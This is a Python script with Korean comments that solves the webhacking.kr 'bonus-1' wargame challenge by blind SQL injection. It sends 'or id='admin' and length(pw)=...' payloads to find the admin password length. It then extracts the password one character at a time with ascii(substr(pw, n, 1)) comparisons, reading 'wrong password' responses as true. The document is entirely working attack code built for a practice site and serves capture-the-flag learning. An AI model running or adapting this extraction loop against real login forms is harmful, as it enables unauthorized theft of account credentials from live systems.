import requests

url = 'https://webhacking.kr/challenge/bonus-1/index.php'
cookie = {"PHPSESSID": "본인 쿠키값 대입"}  # 세션 유지를 위한 쿠키값 대입

def find_password_length():
    for length in range(31, 40):  # 비밀번호 길이가 30보다 크고 40보다 작음을 알 수 있음 
        payload = f"?id=admin&pw=' or id='admin' and length(pw)={length} -- "  # URL에 대입하는 값 (길이 반복), '--' 부분은 sql에서 주석을 뜻한다.
        res = requests.get(url + payload, cookies=cookie)  # URL + payload를 통해 PHP?=id~로 시작함
        if "wrong password" in res.text:  # 만약 조건이 틀리면 "wrong password"를 출력함 [우리에게는 참인 결과임]
            return length
        
#find_length_password = find_password_length()
#print("Found password length : ",find_length_password)

def find_password():
    password = "" #비밀번호를 담을 빈 문자열 생성
    password_length = find_password_length() #find_password_length() 호출
    for position in range(1, password_length + 1): #첫번째 자리에서 아스키 코드로 확인 후 두번째 자리로 넘어가 똑같이 확인 
        for ascii_code in range(33, 127):  # ASCII printable 문자 범위 설정 (공백 포함)
            payload = f"?id=admin&pw=' or id='admin' and ascii(substr(pw, {position}, 1)) = {ascii_code} -- " #substr() 함수는 위치를 찾는것이다 , 위치를 찾아 ascii 변환 후 비교후 대입
            res = requests.get(url + payload, cookies=cookie)
            if "wrong password" in res.text:  # 만약 참인 경우 -> "wrong password"이 출력되니
                password += chr(ascii_code)
                print("Found partial password:", password)
                break
    return password

found_password = find_password()
print("Found Password:", found_password)
